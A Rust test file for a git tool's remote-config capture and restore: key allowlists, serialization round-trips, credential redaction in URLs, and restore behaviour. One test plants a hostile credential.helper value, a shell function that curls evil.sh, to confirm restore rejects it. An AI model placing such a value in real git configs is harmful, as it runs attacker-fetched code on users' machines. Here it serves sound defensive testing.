//! Remote-data capture/restore contract tests (docs/plan-remote-data.md,
//! M0): allowlist, `-z` framing round-trip, userinfo detection, and
//! capture/restore against real repos.

#![cfg(feature = "git")]

use std::path::{Path, PathBuf};

use gfx::remotes::{
    capture, capture_remote_refs, contains_credential, drop_remote_refs, filter_allowed,
    is_allowed_key, pin_remote_refs, redact_userinfo, restore, RemoteState, RestoreMode,
};

fn tmpdir(tag: &str) -> PathBuf {
    let p = std::env::temp_dir().join(format!(
        "gfx-rmt-{}-{}",
        tag,
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&p);
    std::fs::create_dir_all(&p).unwrap();
    p
}

fn git(dir: &Path, args: &[&str]) -> Vec<u8> {
    let out = std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?} failed: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    out.stdout
}

// ---------------------------------------------------------------- pure

#[test]
fn allowlist_table() {
    // Remote data keys: allowed.
    for k in [
        "remote.origin.url",
        "remote.origin.pushurl",
        "remote.origin.fetch",
        "remote.origin.mirror",
        "remote.origin.prune",
        "remote.origin.prunetags",
        "remote.origin.tagopt",
        "remote.origin.promisor",
        "remote.origin.partialclonefilter",
        "remote.origin.proxy",
        "remote.origin.serveroption",
        "remote.origin.skipdefaultupdate",
        "remote.origin.followremotehead",
        "remote.dotted.name.url", // dots in the remote name
        "branch.main.remote",
        "branch.main.merge",
        "branch.main.pushremote",
        "branch.main.rebase",
        "branch.main.description",
        "lfs.url",
        "lfs.origin.url",
    ] {
        assert!(is_allowed_key(k), "{k} should be allowed");
    }
    // Executable / out-of-domain keys: never allowed (D2).
    for k in [
        "credential.helper",
        "credential.https://example.com.helper",
        "remote.origin.uploadpack",
        "remote.origin.receivepack",
        "remote.origin.gcrypt-participants", // unknown subkey: not v1
        "filter.lfs.clean",
        "diff.external.command",
        "branch.autosetupmerge", // not a branch.<name>.<sub> tracking key
        "branch.main.mergeoptions",
        "lfs.locksverify",
        "core.bare",
        "user.email",
        "remote.",
        "remote.url",          // no remote name segment
        "branch.remote",       // no branch name segment
        "lfs..url",
    ] {
        assert!(!is_allowed_key(k), "{k} must NOT be allowed");
    }
}

#[test]
fn z_framing_round_trip_hostile_values() {
    let entries = vec![
        ("remote.origin.url".to_string(), "https://example.com/r.git".to_string()),
        // Newlines, quotes, '=', tabs, unicode in values.
        ("branch.main.description".to_string(), "line one\nline two\n".to_string()),
        ("remote.origin.serveroption".to_string(), "a=b\"c\td".to_string()),
        ("remote.origin.url".to_string(), "https://例え.jp/r.git".to_string()),
        ("branch.empty.description".to_string(), String::new()),
    ];
    let state = RemoteState { entries: entries.clone() };
    let bytes = state.serialize_z();
    let back = RemoteState::parse_z(&bytes).unwrap();
    assert_eq!(back.entries, entries, "parse(serialize(x)) == x");
}

#[test]
fn z_framing_rejects_malformed() {
    // No key/value separator.
    assert!(RemoteState::parse_z(b"key-without-separator\0").is_err());
    // Not UTF-8.
    assert!(RemoteState::parse_z(b"key\nval\xffue\0").is_err());
    // Empty input is a valid empty state.
    assert!(RemoteState::parse_z(b"").unwrap().is_empty());
}

#[test]
fn userinfo_detection_and_redaction() {
    // (url, is_credential, redacted-render)
    let cases = [
        ("https://user:token@example.com/r.git", true, "https://***@example.com/r.git"),
        // Bare token on https: flagged (D3) even without a password colon.
        ("https://user@example.com/r.git", true, "https://***@example.com/r.git"),
        ("https://example.com/r.git", false, "https://example.com/r.git"),
        ("https://u:p@[::1]:8080/r.git", true, "https://***@[::1]:8080/r.git"),
        // ssh with a bare username: identity, not a credential.
        ("ssh://git@example.com:2222/r.git", false, "ssh://***@example.com:2222/r.git"),
        // ssh WITH a password: credential.
        ("ssh://git:pw@example.com/r.git", true, "ssh://***@example.com/r.git"),
        ("git@example.com:org/repo.git", false, "git@example.com:org/repo.git"), // scp-like
        ("file:///srv/git/r.git", false, "file:///srv/git/r.git"),
        ("/local/path.git", false, "/local/path.git"),
        // '@' in the path is NOT userinfo.
        ("https://example.com/or@g/r.git", false, "https://example.com/or@g/r.git"),
    ];
    for (url, is_credential, redacted) in cases {
        assert_eq!(contains_credential(url), is_credential, "{url}");
        assert_eq!(redact_userinfo(url), redacted, "{url}");
    }
}

#[test]
fn filter_counts_skips_and_credentials() {
    let all = RemoteState {
        entries: vec![
            ("core.bare".into(), "false".into()),
            ("remote.origin.url".into(), "https://u:t@h/r.git".into()),
            ("remote.origin.fetch".into(), "+refs/heads/*:refs/remotes/origin/*".into()),
            ("credential.helper".into(), "store".into()),
            ("remote.origin.uploadpack".into(), "evil-cmd".into()),
            ("branch.main.remote".into(), "origin".into()),
            ("lfs.locksverify".into(), "true".into()),
            ("user.email".into(), "t@t".into()),
        ],
    };
    let out = filter_allowed(all);
    assert_eq!(
        out.state.entries,
        vec![
            ("remote.origin.url".to_string(), "https://u:t@h/r.git".to_string()),
            (
                "remote.origin.fetch".to_string(),
                "+refs/heads/*:refs/remotes/origin/*".to_string()
            ),
            ("branch.main.remote".to_string(), "origin".to_string()),
        ],
        "allowlisted entries kept, in order"
    );
    assert_eq!(out.skipped, 3, "credential.helper + uploadpack + lfs.locksverify");
    assert_eq!(out.credential_keys, vec!["remote.origin.url"], "key named, value never");
}

#[test]
fn render_text_redacts_only_url_keys() {
    let state = RemoteState {
        entries: vec![
            ("remote.origin.url".into(), "https://u:t@h/r.git".into()),
            ("branch.main.description".into(), "has\nnewline".into()),
        ],
    };
    let text = state.render_text();
    assert!(text.contains("remote.origin.url=https://***@h/r.git"), "{text}");
    assert!(text.contains("branch.main.description=has\\nnewline"), "{text}");
    assert!(!text.contains("u:t@"), "credential must not render");
}

// ------------------------------------------------- against real repos

/// A repo whose config exercises the allowlist: remote with url/pushurl/
/// multi-fetch/mirror, branch tracking, an executable key (must be
/// skipped), and out-of-domain noise.
fn configured_repo(tag: &str) -> (PathBuf, Vec<(String, String)>) {
    let base = tmpdir(tag);
    let repo = base.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q"]);
    git(&repo, &["config", "remote.origin.url", "https://example.com/org/repo.git"]);
    git(&repo, &["config", "remote.origin.pushurl", "ssh://git@example.com/org/repo.git"]);
    git(&repo, &["config", "remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*"]);
    git(&repo, &["config", "--add", "remote.origin.fetch", "+refs/tags/*:refs/tags/*"]);
    git(&repo, &["config", "remote.origin.mirror", "true"]);
    git(&repo, &["config", "branch.main.remote", "origin"]);
    git(&repo, &["config", "branch.main.merge", "refs/heads/main"]);
    git(&repo, &["config", "credential.helper", "osxkeychain"]); // must NOT travel
    git(&repo, &["config", "core.autocrlf", "false"]); // noise
    let expected = vec![
        ("remote.origin.url".into(), "https://example.com/org/repo.git".into()),
        ("remote.origin.pushurl".into(), "ssh://git@example.com/org/repo.git".into()),
        ("remote.origin.fetch".into(), "+refs/heads/*:refs/remotes/origin/*".into()),
        ("remote.origin.fetch".into(), "+refs/tags/*:refs/tags/*".into()),
        ("remote.origin.mirror".into(), "true".into()),
        ("branch.main.remote".into(), "origin".into()),
        ("branch.main.merge".into(), "refs/heads/main".into()),
    ];
    (repo, expected)
}

#[test]
fn capture_filters_and_preserves_order() {
    let (repo, expected) = configured_repo("cap");
    let out = capture(&repo).unwrap();
    assert_eq!(out.state.entries, expected);
    assert_eq!(out.skipped, 1, "credential.helper counted as skipped");
    assert!(out.credential_keys.is_empty(), "no credentials in these URLs");
    let _ = std::fs::remove_dir_all(repo.parent().unwrap());
}

#[test]
fn restore_overwrite_into_fresh_repo_is_exact_and_idempotent() {
    let (src, expected) = configured_repo("ovs");
    let state = capture(&src).unwrap().state;

    let base = tmpdir("ovd");
    let dst = base.join("dst");
    std::fs::create_dir_all(&dst).unwrap();
    git(&dst, &["init", "-q"]);

    let r1 = restore(&dst, &state, RestoreMode::Overwrite).unwrap();
    assert_eq!(r1.keys_set, 6, "url/pushurl/fetch/mirror + 2 branch keys");
    assert_eq!(r1.values_added, 7, "multi-valued fetch adds twice");
    assert_eq!(capture(&dst).unwrap().state.entries, expected, "exact");

    // Repeat: identical result (idempotent), not doubled entries.
    let r2 = restore(&dst, &state, RestoreMode::Overwrite).unwrap();
    assert_eq!(r2.values_added, 7);
    assert_eq!(capture(&dst).unwrap().state.entries, expected, "still exact, not doubled");

    let _ = std::fs::remove_dir_all(src.parent().unwrap());
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn restore_add_missing_never_overwrites_drift() {
    let (src, _) = configured_repo("ams");
    let state = capture(&src).unwrap().state;

    let base = tmpdir("amd");
    let dst = base.join("dst");
    std::fs::create_dir_all(&dst).unwrap();
    git(&dst, &["init", "-q"]);
    // Pre-existing DIFFERENT value: drift; and one matching key.
    git(&dst, &["config", "remote.origin.url", "https://moved.example.com/r.git"]);
    git(&dst, &["config", "branch.main.remote", "origin"]);

    let r = restore(&dst, &state, RestoreMode::AddMissing).unwrap();
    let live = capture(&dst).unwrap().state;
    assert_eq!(
        live.get_all("remote.origin.url"),
        vec!["https://moved.example.com/r.git"],
        "live value wins; snapshot never overwrites"
    );
    assert!(r.drift.contains(&"remote.origin.url".to_string()), "drift reported: {:?}", r.drift);
    assert!(r.keys_set >= 3, "absent keys added: {:?}", r);
    assert_eq!(live.get_all("remote.origin.mirror"), vec!["true"], "absent key added");
    assert_eq!(live.get_all("branch.main.remote"), vec!["origin"], "matching key untouched");

    let _ = std::fs::remove_dir_all(src.parent().unwrap());
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn restore_rejects_executable_keys_from_untrusted_input() {
    // Defense in depth (plan M2): a hand-edited snapshot/archive member
    // must not smuggle executable keys through restore.
    let base = tmpdir("rej");
    let repo = base.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q"]);
    let hostile = RemoteState {
        entries: vec![
            ("credential.helper".into(), "!f() { curl evil.sh; }; f".into()),
            ("remote.origin.uploadpack".into(), "evil-cmd".into()),
            ("remote.origin.url".into(), "https://example.com/r.git".into()),
        ],
    };
    let r = restore(&repo, &hostile, RestoreMode::Overwrite).unwrap();
    assert_eq!(r.rejected, 2, "both executable keys refused");
    assert_eq!(r.keys_set, 1);
    let live = git(&repo, &["config", "--list", "--local"]);
    let text = String::from_utf8(live).unwrap();
    assert!(!text.contains("credential.helper"), "{text}");
    assert!(!text.contains("uploadpack"), "{text}");
    assert!(text.contains("remote.origin.url=https://example.com/r.git"), "{text}");
    let _ = std::fs::remove_dir_all(&base);
}

#[test]
fn remote_refs_capture_drop_pin() {
    let base = tmpdir("refs");
    let repo = base.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "--bare"]);
    // Two commits so we can pin at a non-tip OID.
    let work = base.join("w");
    std::fs::create_dir_all(&work).unwrap();
    git(&work, &["init", "-q"]);
    git(&work, &["-c", "user.email=t@t", "-c", "user.name=T", "commit", "-qm", "one", "--allow-empty"]);
    git(&work, &["-c", "user.email=t@t", "-c", "user.name=T", "commit", "-qm", "two", "--allow-empty"]);
    let tip = String::from_utf8(git(&work, &["rev-parse", "HEAD~1"])).unwrap();
    let tip = tip.trim().to_string();
    git(&work, &["push", "-q", &repo.to_string_lossy(), "HEAD:refs/heads/main"]);
    git(&repo, &["update-ref", "refs/remotes/origin/main", "refs/heads/main"]);
    git(&repo, &["update-ref", "refs/remotes/origin/dev", "refs/heads/main"]);

    let saved = capture_remote_refs(&repo).unwrap();
    assert_eq!(saved.len(), 2);

    let dropped = drop_remote_refs(&repo).unwrap();
    assert_eq!(dropped, 2);
    assert!(capture_remote_refs(&repo).unwrap().is_empty());

    // Pin at the pre-rewrite OID (here: an ancestor), recreate one ref.
    let pinned = pin_remote_refs(&repo, &[("refs/remotes/origin/main".into(), tip.clone())]).unwrap();
    assert_eq!(pinned, 1);
    let now = capture_remote_refs(&repo).unwrap();
    assert_eq!(now, vec![("refs/remotes/origin/main".to_string(), tip)]);

    let _ = std::fs::remove_dir_all(&base);
}
